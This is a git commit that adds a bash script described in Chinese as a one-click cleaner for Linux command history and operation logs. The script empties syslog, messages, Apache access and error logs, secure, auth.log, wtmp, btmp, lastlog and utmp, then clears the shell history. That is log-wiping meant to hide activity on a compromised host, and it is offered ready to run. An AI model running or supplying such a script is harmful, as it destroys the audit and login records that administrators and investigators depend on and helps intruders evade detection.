2f5925e32405b707d289ccf3446b71241206abd7
majie88881234 <1014353509@qq.com>
2018-11-27 14:37:04 +0800

    History-bye_for-Linux
    一键清理Linux历史命令和操作日志！

---
+++ hbfl.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+echo > /var/log/syslog
+echo > /var/log/messages
+echo > /var/log/httpd/access_log
+echo > /var/log/httpd/error_log
+echo > /var/log/xferlog
+echo > /var/log/secure
+echo > /var/log/auth.log
+echo > /var/log/user.log
+echo > /var/log/wtmp
+echo > /var/log/lastlog
+echo > /var/log/btmp
+echo > /var/run/utmp
+history -c
+echo "Success!"
